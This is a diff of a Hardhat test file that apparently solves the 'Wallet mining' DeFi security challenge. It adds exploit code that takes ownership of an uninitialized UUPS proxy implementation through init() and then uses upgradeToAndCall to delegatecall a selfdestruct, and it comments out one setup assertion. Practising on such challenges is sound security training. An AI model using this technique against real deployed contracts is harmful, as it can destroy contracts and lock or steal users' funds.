@@ -39,7 +39,7 @@ describe('[Challenge] Wallet mining', function () {
         await walletDeployer.rule(authorizer.address);
         expect(await walletDeployer.mom()).to.eq(authorizer.address);
 
-        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
+        //await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
         //await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;
 
         // Fund Safe Deployer with tokens
@@ -72,8 +72,8 @@ describe('[Challenge] Wallet mining', function () {
         const FACTORY = "0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B".toLowerCase();
         // Master Copy address according with WalletDeployer contract, it's empty
         const COPY = "0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F".toLowerCase();
-        // Looking on goerli.etherscan we see this address created both factory and copy
-        // With the addresses we saw before
+        // Looking on goerli.etherscan with the addresses we saw before 
+        // We see this address created both factory and copy
         const CREATOR = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A".toLowerCase();
 
         // Deploy our contract
@@ -81,9 +81,26 @@ describe('[Challenge] Wallet mining', function () {
             walletDeployer.address
         );
     
-        // Make our HackWalletMining contract the AuthorizerUpgradeable v2
-        // This AuthorizerUpgradeable is used by WalletDeployer to allow users to create a Proxy
-        await authorizer.connect(deployer).upgradeTo(hackWalletMining.address);
+
+        // The implementation has not been initialized, so we can get the address and do it
+        // Implementation slot address is from EIP-1967 https://eips.ethereum.org/EIPS/eip-1967
+        const implementationSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
+        const implementationAddressBytes32 = await ethers.provider.getStorageAt(authorizer.address, implementationSlot);
+        const implementationAddress = ethers.utils.defaultAbiCoder.decode([ "address" ], implementationAddressBytes32)[0];
+        const implementationContract = await ethers.getContractAt("AuthorizerUpgradeable", implementationAddress);
+        (await implementationContract.connect(player).init([], [])).wait();
+
+        // Once we're the owner of the implementation, we can call the upgradeToAndCall function
+        // This function makes a delegate call, so we can point to our contract and call the function destroy
+        // This function is going to make a selfdestruct
+        // if and(not(iszero(returndatasize())), iszero(mload(p))) {return(0,0)}
+        // Since there is no return data, we bypass this conditional
+        // Because what this conditional does is: if the returndata is not zero and the response is zero, makes an early return
+        // Because the returndata is zero, the second conditional is not checked
+        // Create ABI to delegate call attacking contract
+        const IFace = new ethers.utils.Interface(["function destroy()"]);
+        const destroyData = IFace.encodeFunctionData("destroy");
+        (await implementationContract.connect(player).upgradeToAndCall(hackWalletMining.address, destroyData)).wait();
 
         /*
             Once we have access to the WalletDeployer throught the authorizer
